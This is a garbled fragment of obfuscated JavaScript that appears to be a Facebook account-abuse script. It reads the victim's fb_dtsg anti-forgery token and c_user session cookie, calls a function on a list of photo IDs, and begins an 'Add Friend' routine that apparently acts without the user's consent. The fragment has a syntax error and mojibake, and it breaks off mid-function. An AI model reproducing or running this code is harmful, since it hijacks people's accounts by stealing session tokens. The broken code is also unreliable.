...
var _0x3384x1 = [{
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/chiyeu1nguoimathoi" target="_blank">Cáº­u Bim</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
...
//ảnh avatar
P("408746859242253");P("407932042657068");P"390150117768594");
P("375015709282035");P("411446428972296");
/*Add Friend*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
